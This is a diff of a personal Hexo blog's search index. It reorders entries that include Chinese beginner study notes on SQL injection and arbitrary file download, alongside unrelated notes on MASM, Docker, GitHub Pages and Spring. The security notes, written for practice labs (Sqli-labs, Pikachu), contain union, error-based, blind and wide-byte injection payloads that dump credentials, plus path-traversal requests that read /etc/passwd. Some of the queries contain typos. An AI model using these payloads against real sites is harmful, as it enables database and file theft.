@@ -1,168 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>SQL注入学习笔记</title>
-    <url>/2024/06/02/SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
-SQL注入当客户端提交的数据未作处理或转义，直接带入数据库
-具体来说，当Web应用程序对用户输入数据的合理性没有进行判断时，前端传入后端的参数就可能被攻击者所控制，并且根据这些参数带入数据库查询。攻击者可以通过构造不同的SQL语句来对数据库进行任意查询、增加、删除或修改等操作——-&gt;(通过构造一条精巧的语句来查询想要得到的信息 )
-
-分类
-按照查询字段
-字符型：当输入的参数为字符串时，称为字符型
-数字型：当输入的参数为整形时，可以认为是数字型注入
-
-
-按照注入方法
-Union注入(联合注入)
-报错注入
-布尔注入
-时间注入
-
-
-
-注入点是可以实行注入的地方，通常是一个访问数据库的连接 
-比如
-http://2.0.0.1/sql/Less-1/index.php?id= //id这个地方就是一个注入点
-
-判断字符型注入和数字型注入数字型一般提交内容为数字，但是数字不一定为数字型
-1.使用and 1&#x3D;1 和 and 1&#x3D;2来判断
-
-如果提交and 1&#x3D;1 和 and 1&#x3D;2都能正常显示界面，则为字符型注入，原因是输入的东西相当于被引号括起来了，and就不是 指令(字符型需要闭合符’’来提交)
-如果提交and 1&#x3D;1能正常显示，提交and 1&#x3D;2不能正常显示，则为数字型
-
-2.可以使用 2-1判断
-http://2.0.0.1/sql/Less-1/index.php?id= 2-1//数字型：会查找id=1的值//字符型：不能运算，仍然显示原来的结果
-
-ps：为什么不用+？+有的时候会被理解为空格
-闭合方式‘ , “ , ‘) , “)
-
-闭合的作用手动提交闭合符号，结束前一段查询语句
-后面即可加入其他语句，查询需要的参数
-不需要的语句可以用注释符号’–+’或’#’或’%23’注释掉
-Union联合注入注意：联合查询必须要求列数一致，否则报错
-查询回显位：查询回显位通常指的是在执行查询操作后，确定查询结果在页面上的哪个位置显示出来。这通常与网页开发、数据库查询以及命令行界面操作相关。
-步骤​	0.查找注入点
-
-先判断字符型注入还是数字型注入，如果是字符型，找到它的闭合方式
- /*1.字符型：要自己加一个闭合符提前结束闭合，不然group by语句被闭合就失效了 ?id=1&#x27; group by 10 --+2.数字型：直接group by----用order by也可以-----*/
-
-
-二分法判断列数（group by&#x2F;order by），比如先group by 10 再group by 5这样
-
-根据列数进行union查询
- -- 比如得到列数是3字符型?id=1&#x27; union select 1,2,3 --+-- 如果想看到联合查询查出来的东西，那么需要让前面为假（可以让id等于一个没有的值）
-
-查询回显位置
-
-
-拿到表名!!!数据库information_schema
-
- 
--- 比如对于Less-1(字符型)...../index.php?id=0&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ 加上where限定是回显位显示的更准确，直接等于database()能更好绕过防火墙
-
-即使加上了where限定，但是对于多个属于同一个库的表，还是会出现回显位只能显示第一个表的情况。这时需要group_concat()
-/index.php?id=0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where schema.table_scema=database() --+  就能显示属于当前库所有表
-
-拿到列名与前面类似
-/index.php?id=0&#x27; union select 1,column_name,3 from information_schema.columns where table_shcema=database() and table_name = &#x27;users&#x27; --+ 
-
-可以获取到表名为users，列名id，username，password，然后就可以获取全部信息了
-字符型：/index.php id=-1&#x27; union select 1,group_concat(username,password),3 from user --+
-
-group_concat()之间可以自己加入分隔符加强可读性
-数字型union注入与字符型的区别：不用判断闭合方式
-报错注入
-
-报错注入：构造语句，让错误信息中夹杂可以显示数据库内容的查询语句
-extractvalue注入select extractvalue(列名（XML文档对象名称）,路径) from 表名;-- 注入的时候不考虑列到底存不存在
-
-如何让它报错1.如果只是写错路径下的名字，不会报错，只是找不到
-2.路径格式错误，报错，会把错的路径报出来
-​	构造思路：既然错的路径会被报出来，能不能利用这一点，在报错这个地方报错之前先回显一些有用的信息
-select extractvalue(列名,concat(0x7e,(select database())) from 表名;-- 0x7e是~的ASCII值，使路径错误引起报错                   
-
-index.php?id=1 union select 1,2,extractvalue(1,concat(0x7e,(concat(select database()))))-- 路径错误引起报错，可以回显当前数据库的名字-- 也可以这么写index.php?id=1 and 1=extractvalue(1,concat(0x7e,(concat(select database()))))
-
-如何获得不同的信息在concat的第二个参数动手脚
-获取表名
-index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))
-
-获取列名
-index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))
-
-获取详细信息
-index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_by(id,username,password) from 想查的表名)))
-
-ps:报错的回显位最多只能显示32个字符，可以用substring解决这个问题
-
-index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select substring(group_by(id,username,password),30,30) from 想查的表名)))-- 从第30个字符再往后显示30个字符
-
-updatexml注入
-原理与extractvalue()一样，在第二个参数-xml路径上动手脚，参数用法也和extractvalue()一样
-
-floor报错
-
-
-
-
-报错原理
-
-分析rand()中传入0后，floor(rand(0)*2)随机出的字符串为01101，rand()函数进行分组group by和统计count()时可能会多次执行，导致键值key重复
-
-第一次统计时，group_key里面没有security-0这个键值，concat_ws()要重新计算一个键值给它（指group_key），计算的结果就是0下一位security-1，加入group_key中，进行统计；第二次统计时，键值存在，其实算的是第三位的security-1，键值存在，count（）++；再下一位，遇到security-0，键值不存在，重新计算到下一位security-1，加入group_key中，但是原本已经有security-1这个键值了，发生键值冲突，报错
-select count(*),concat_ws(&#x27;-&#x27;,(database()),floor(rand(0)*2)) as a from 表名 group by a;/*这里的from 表名 是为了让rand（）产生足够多次数的计算，一般使用行数较多的默认数据表，比如information_schema.tables*/
-
-
-
-盲注
-布尔盲注web页面只返回true真和false假 两种类型，利用页面返回不同，逐个猜解数据
-
-
-
-
-但是ascii()并不能对字符串中的每个字符都求得ascii值，只能显示第一个字符的ascii码值，所以需要substr(str,n,k)&#x2F;substring(str,n,k)来辅助(从第n个字符开始显示k个字符)
-index.php?id=1 and substr((&#x27;abcd&#x27;),1,1) //把abcd换成想要的语句
-
-
-时间盲注
-
-
--- 可以根据页面响应时间判断字符型-闭合方式/数字型
-
-
--- exampleselect if(acsii(substr((select database()),1,1))&gt;=97,sleep(10),sleep(0))
-
-
-
-宽字节注入
-
-局限性：宽字节注入必须使用GBKB编码
-意思就是%5c()原本应该和后面的单引号结合，但是却被解析成和前面自己输入进去的一个字符结合，使得\失去自己的作用
-
-http://192.168.127.186/sql/Less-32/index.php?id=-1%df&#x27; union select 1,group_concat(username,id,password),3 from users --+
-
-
-
-注入文件上传mysql文件上传要点show variables like &#x27;%secure%&#x27;; -- 来查看MySQL是否有读写文件权限，如果secure_file_priv的值是空的，那么MySQL可以在任何位置读取和写入文件（这通常是不安全的）。如果它被设置为一个目录的路径，那么MySQL只能在该目录内读取和写入文件into outfile 命令的使用环境:必须知道一个，服务器上可以写入文件的文件夹的完整路径
-
-步骤
-还是先判断字符型和数字型
-如果是字符型，再判断闭合方式 加上and 1&#x3D;2 和and 1&#x3D;1判断闭合符是否正确
-然后判断列数
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>SQL注入</tag>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>IA32架构的MASM</title>
     <url>/2025/06/02/IA32%E6%9E%B6%E6%9E%84%E7%9A%84MASM/</url>
     <content><![CDATA[前言本博客用于复习IA32架构下微软宏汇编(MASM)的基础知识。作为初学者，本人水平有限，若内容存在疏漏或错误，恳请读者斧正
@@ -1097,6 +935,168 @@ eg.模拟v-show
       </tags>
   </entry>
   <entry>
+    <title>SQL注入学习笔记</title>
+    <url>/2024/06/02/SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
+SQL注入当客户端提交的数据未作处理或转义，直接带入数据库
+具体来说，当Web应用程序对用户输入数据的合理性没有进行判断时，前端传入后端的参数就可能被攻击者所控制，并且根据这些参数带入数据库查询。攻击者可以通过构造不同的SQL语句来对数据库进行任意查询、增加、删除或修改等操作——-&gt;(通过构造一条精巧的语句来查询想要得到的信息 )
+
+分类
+按照查询字段
+字符型：当输入的参数为字符串时，称为字符型
+数字型：当输入的参数为整形时，可以认为是数字型注入
+
+
+按照注入方法
+Union注入(联合注入)
+报错注入
+布尔注入
+时间注入
+
+
+
+注入点是可以实行注入的地方，通常是一个访问数据库的连接 
+比如
+http://2.0.0.1/sql/Less-1/index.php?id= //id这个地方就是一个注入点
+
+判断字符型注入和数字型注入数字型一般提交内容为数字，但是数字不一定为数字型
+1.使用and 1&#x3D;1 和 and 1&#x3D;2来判断
+
+如果提交and 1&#x3D;1 和 and 1&#x3D;2都能正常显示界面，则为字符型注入，原因是输入的东西相当于被引号括起来了，and就不是 指令(字符型需要闭合符’’来提交)
+如果提交and 1&#x3D;1能正常显示，提交and 1&#x3D;2不能正常显示，则为数字型
+
+2.可以使用 2-1判断
+http://2.0.0.1/sql/Less-1/index.php?id= 2-1//数字型：会查找id=1的值//字符型：不能运算，仍然显示原来的结果
+
+ps：为什么不用+？+有的时候会被理解为空格
+闭合方式‘ , “ , ‘) , “)
+
+闭合的作用手动提交闭合符号，结束前一段查询语句
+后面即可加入其他语句，查询需要的参数
+不需要的语句可以用注释符号’–+’或’#’或’%23’注释掉
+Union联合注入注意：联合查询必须要求列数一致，否则报错
+查询回显位：查询回显位通常指的是在执行查询操作后，确定查询结果在页面上的哪个位置显示出来。这通常与网页开发、数据库查询以及命令行界面操作相关。
+步骤​	0.查找注入点
+
+先判断字符型注入还是数字型注入，如果是字符型，找到它的闭合方式
+ /*1.字符型：要自己加一个闭合符提前结束闭合，不然group by语句被闭合就失效了 ?id=1&#x27; group by 10 --+2.数字型：直接group by----用order by也可以-----*/
+
+
+二分法判断列数（group by&#x2F;order by），比如先group by 10 再group by 5这样
+
+根据列数进行union查询
+ -- 比如得到列数是3字符型?id=1&#x27; union select 1,2,3 --+-- 如果想看到联合查询查出来的东西，那么需要让前面为假（可以让id等于一个没有的值）
+
+查询回显位置
+
+
+拿到表名!!!数据库information_schema
+
+ 
+-- 比如对于Less-1(字符型)...../index.php?id=0&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ 加上where限定是回显位显示的更准确，直接等于database()能更好绕过防火墙
+
+即使加上了where限定，但是对于多个属于同一个库的表，还是会出现回显位只能显示第一个表的情况。这时需要group_concat()
+/index.php?id=0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where schema.table_scema=database() --+  就能显示属于当前库所有表
+
+拿到列名与前面类似
+/index.php?id=0&#x27; union select 1,column_name,3 from information_schema.columns where table_shcema=database() and table_name = &#x27;users&#x27; --+ 
+
+可以获取到表名为users，列名id，username，password，然后就可以获取全部信息了
+字符型：/index.php id=-1&#x27; union select 1,group_concat(username,password),3 from user --+
+
+group_concat()之间可以自己加入分隔符加强可读性
+数字型union注入与字符型的区别：不用判断闭合方式
+报错注入
+
+报错注入：构造语句，让错误信息中夹杂可以显示数据库内容的查询语句
+extractvalue注入select extractvalue(列名（XML文档对象名称）,路径) from 表名;-- 注入的时候不考虑列到底存不存在
+
+如何让它报错1.如果只是写错路径下的名字，不会报错，只是找不到
+2.路径格式错误，报错，会把错的路径报出来
+​	构造思路：既然错的路径会被报出来，能不能利用这一点，在报错这个地方报错之前先回显一些有用的信息
+select extractvalue(列名,concat(0x7e,(select database())) from 表名;-- 0x7e是~的ASCII值，使路径错误引起报错                   
+
+index.php?id=1 union select 1,2,extractvalue(1,concat(0x7e,(concat(select database()))))-- 路径错误引起报错，可以回显当前数据库的名字-- 也可以这么写index.php?id=1 and 1=extractvalue(1,concat(0x7e,(concat(select database()))))
+
+如何获得不同的信息在concat的第二个参数动手脚
+获取表名
+index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))
+
+获取列名
+index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))
+
+获取详细信息
+index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_by(id,username,password) from 想查的表名)))
+
+ps:报错的回显位最多只能显示32个字符，可以用substring解决这个问题
+
+index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select substring(group_by(id,username,password),30,30) from 想查的表名)))-- 从第30个字符再往后显示30个字符
+
+updatexml注入
+原理与extractvalue()一样，在第二个参数-xml路径上动手脚，参数用法也和extractvalue()一样
+
+floor报错
+
+
+
+
+报错原理
+
+分析rand()中传入0后，floor(rand(0)*2)随机出的字符串为01101，rand()函数进行分组group by和统计count()时可能会多次执行，导致键值key重复
+
+第一次统计时，group_key里面没有security-0这个键值，concat_ws()要重新计算一个键值给它（指group_key），计算的结果就是0下一位security-1，加入group_key中，进行统计；第二次统计时，键值存在，其实算的是第三位的security-1，键值存在，count（）++；再下一位，遇到security-0，键值不存在，重新计算到下一位security-1，加入group_key中，但是原本已经有security-1这个键值了，发生键值冲突，报错
+select count(*),concat_ws(&#x27;-&#x27;,(database()),floor(rand(0)*2)) as a from 表名 group by a;/*这里的from 表名 是为了让rand（）产生足够多次数的计算，一般使用行数较多的默认数据表，比如information_schema.tables*/
+
+
+
+盲注
+布尔盲注web页面只返回true真和false假 两种类型，利用页面返回不同，逐个猜解数据
+
+
+
+
+但是ascii()并不能对字符串中的每个字符都求得ascii值，只能显示第一个字符的ascii码值，所以需要substr(str,n,k)&#x2F;substring(str,n,k)来辅助(从第n个字符开始显示k个字符)
+index.php?id=1 and substr((&#x27;abcd&#x27;),1,1) //把abcd换成想要的语句
+
+
+时间盲注
+
+
+-- 可以根据页面响应时间判断字符型-闭合方式/数字型
+
+
+-- exampleselect if(acsii(substr((select database()),1,1))&gt;=97,sleep(10),sleep(0))
+
+
+
+宽字节注入
+
+局限性：宽字节注入必须使用GBKB编码
+意思就是%5c()原本应该和后面的单引号结合，但是却被解析成和前面自己输入进去的一个字符结合，使得\失去自己的作用
+
+http://192.168.127.186/sql/Less-32/index.php?id=-1%df&#x27; union select 1,group_concat(username,id,password),3 from users --+
+
+
+
+注入文件上传mysql文件上传要点show variables like &#x27;%secure%&#x27;; -- 来查看MySQL是否有读写文件权限，如果secure_file_priv的值是空的，那么MySQL可以在任何位置读取和写入文件（这通常是不安全的）。如果它被设置为一个目录的路径，那么MySQL只能在该目录内读取和写入文件into outfile 命令的使用环境:必须知道一个，服务器上可以写入文件的文件夹的完整路径
+
+步骤
+还是先判断字符型和数字型
+如果是字符型，再判断闭合方式 加上and 1&#x3D;2 和and 1&#x3D;1判断闭合符是否正确
+然后判断列数
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>SQL注入</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Docker</title>
     <url>/2025/01/06/docker/</url>
     <content><![CDATA[初识Docker环境为Ubuntu
@@ -1661,125 +1661,6 @@ manifest字段格式
       <tags>
         <tag>Web安全</tag>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>任意文件下载漏洞学习笔记</title>
-    <url>/2024/10/14/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
-    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
-参考：https://blog.csdn.net/qq_43531669/article/details/116865660
-什么是任意文件下载&#x2F;读取？任意文件读取&#x2F;下载漏洞（Arbitrary File Read&#x2F;Download Vulnerability），是指攻击者可以通过某些漏洞，绕过应用程序的限制，直接读取或下载应用程序之外的文件。
-这种漏洞通常是由于应用程序没有对用户输入进行充分的验证和过滤而导致的。攻击者可以通过构造恶意的请求来利用该漏洞，从而读取或下载他们本来无权访问的文件，如密码、私钥、证书等，会提供攻击者更多可用信息，提高被入侵的风险。
-这里以 Pikachu 靶场的 unsafe filedownload 模块为例：
-下载文件后复制下载链接
-得到：http://192.168.127.140/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png
-filename通过GET方法传入后端
-直接看代码
-
-filename传进来后直接拼接在download下了，没有进行过滤，所以引发了任意文件下载&#x2F;读取漏洞
-1、漏洞利用条件1. 
-
-存在读文件的函数：
- fopen()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, filesize($file)); // 读取文件内容fclose($fp); // 关闭文件echo $data; // 输出文件内容
-
- fread()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, 1024); // 读取文件前 1024 字节的内容fclose($fp); // 关闭文件echo $data; // 输出文件内容
-
- include()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径include($file); // 包含文件并输出内容
-
- readfile()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径readfile($file); // 读取并输出文件内容
-
- file_get_context()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file_get_contents($file); // 读取文件内容echo $data; // 输出文件内容
-
- file()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file($file); // 将文件读入数组中echo implode(&#x27;&#x27;, $data); // 输出文件内容
-
- 2.读取文件的路径用户可控且未校验或校验不严
- 3.输出了文件内容
-
-
-漏洞类型index.php?f=../../../../../../etc/passwdindex.php?f=../index.phpindex.php?f=ﬁle:///etc/passwd
-
-当参数 f 的参数值为php文件时， 若是文件被解析则是文件包含漏洞，若显示源码或提示下载则是文件查看与下载漏洞。
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>任意文件下载漏洞</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>PHP</tag>
-        <tag>任意文件下载漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搭建自己的GitHub-page</title>
-    <url>/2025/05/21/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84github-Page/</url>
-    <content><![CDATA[搭建自己的github-Page生成SSH Keyssh-keygen -t rsa -C &quot;github绑定邮箱&quot;
-
-
-验证ssh -T git@github.com
-
-
-新建自己的仓库
-
-
-
-
-
-
-
-
-下载git下载链接:https://git-scm.com/downloads/win
-参考链接:https://blog.csdn.net/qq_39809160/article/details/145712755
-
-搭建本地博客创建博客目录
-安装hexonpm install -g hexo/cli
-
-
-#创建一个新的hexo项目hexo init myblogs
-
-
-此时的目录结构
-
-
-cd myblogsnpm install
-
-此时项目结构
-
-运行hexo项目
-hexo server
-
-
-部署到github获取个人token
-
-
-
-
-
-
-打开_config.yml
-
-编辑_config.yml
-当前博客目录安装git插件npm install hexo-deployer-git --save
-
-最后hexo clean      # 清理 Hexo 缓存：hexo generate   # 重新生成静态文件#hexo deploy这步之前要先验证身份#git config --global user.email &quot;272510545@qq.com&quot;#git config --global user.name &quot;blkheadfish&quot;hexo deploy     # hexo deploy
-
-
-博客路径
-博客配置项在_config.yml中
-修改浏览器tab页标题
-
-#部署到githubhexo g -d
-
-
-]]></content>
-      <tags>
-        <tag>杂项</tag>
       </tags>
   </entry>
   <entry>
@@ -2855,7 +2736,8 @@ http状态码为500，服务器端异常
 rollbackFor@Transactional默认只会回滚RuntimeException及其子类异常，要想回滚其他异常，需要配置rollbackFor属性
 //回滚所有异常@Transactional(rollbackFor = Exception.class)
 
-propagation
+propagationpropagation 属性用于定义事务的传播行为，即指定当前方法在执行时如何与已有的事务交互（例如：是否加入已有事务、是否新建事务等）
+
 
 案例
 记录日志这步要放在finally中，这样就可以无论成功失败都能记录
@@ -2894,6 +2776,125 @@ AOPComming soon…
       <tags>
         <tag>Web开发</tag>
         <tag>JavaWeb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>任意文件下载漏洞学习笔记</title>
+    <url>/2024/10/14/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
+    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
+参考：https://blog.csdn.net/qq_43531669/article/details/116865660
+什么是任意文件下载&#x2F;读取？任意文件读取&#x2F;下载漏洞（Arbitrary File Read&#x2F;Download Vulnerability），是指攻击者可以通过某些漏洞，绕过应用程序的限制，直接读取或下载应用程序之外的文件。
+这种漏洞通常是由于应用程序没有对用户输入进行充分的验证和过滤而导致的。攻击者可以通过构造恶意的请求来利用该漏洞，从而读取或下载他们本来无权访问的文件，如密码、私钥、证书等，会提供攻击者更多可用信息，提高被入侵的风险。
+这里以 Pikachu 靶场的 unsafe filedownload 模块为例：
+下载文件后复制下载链接
+得到：http://192.168.127.140/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png
+filename通过GET方法传入后端
+直接看代码
+
+filename传进来后直接拼接在download下了，没有进行过滤，所以引发了任意文件下载&#x2F;读取漏洞
+1、漏洞利用条件1. 
+
+存在读文件的函数：
+ fopen()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, filesize($file)); // 读取文件内容fclose($fp); // 关闭文件echo $data; // 输出文件内容
+
+ fread()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, 1024); // 读取文件前 1024 字节的内容fclose($fp); // 关闭文件echo $data; // 输出文件内容
+
+ include()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径include($file); // 包含文件并输出内容
+
+ readfile()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径readfile($file); // 读取并输出文件内容
+
+ file_get_context()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file_get_contents($file); // 读取文件内容echo $data; // 输出文件内容
+
+ file()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file($file); // 将文件读入数组中echo implode(&#x27;&#x27;, $data); // 输出文件内容
+
+ 2.读取文件的路径用户可控且未校验或校验不严
+ 3.输出了文件内容
+
+
+漏洞类型index.php?f=../../../../../../etc/passwdindex.php?f=../index.phpindex.php?f=ﬁle:///etc/passwd
+
+当参数 f 的参数值为php文件时， 若是文件被解析则是文件包含漏洞，若显示源码或提示下载则是文件查看与下载漏洞。
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>任意文件下载漏洞</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
+        <tag>任意文件下载漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建自己的GitHub-page</title>
+    <url>/2025/05/21/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84github-Page/</url>
+    <content><![CDATA[搭建自己的github-Page生成SSH Keyssh-keygen -t rsa -C &quot;github绑定邮箱&quot;
+
+
+验证ssh -T git@github.com
+
+
+新建自己的仓库
+
+
+
+
+
+
+
+
+下载git下载链接:https://git-scm.com/downloads/win
+参考链接:https://blog.csdn.net/qq_39809160/article/details/145712755
+
+搭建本地博客创建博客目录
+安装hexonpm install -g hexo/cli
+
+
+#创建一个新的hexo项目hexo init myblogs
+
+
+此时的目录结构
+
+
+cd myblogsnpm install
+
+此时项目结构
+
+运行hexo项目
+hexo server
+
+
+部署到github获取个人token
+
+
+
+
+
+
+打开_config.yml
+
+编辑_config.yml
+当前博客目录安装git插件npm install hexo-deployer-git --save
+
+最后hexo clean      # 清理 Hexo 缓存：hexo generate   # 重新生成静态文件#hexo deploy这步之前要先验证身份#git config --global user.email &quot;272510545@qq.com&quot;#git config --global user.name &quot;blkheadfish&quot;hexo deploy     # hexo deploy
+
+
+博客路径
+博客配置项在_config.yml中
+修改浏览器tab页标题
+
+#部署到githubhexo g -d
+
+
+]]></content>
+      <tags>
+        <tag>杂项</tag>
       </tags>
   </entry>
   <entry>
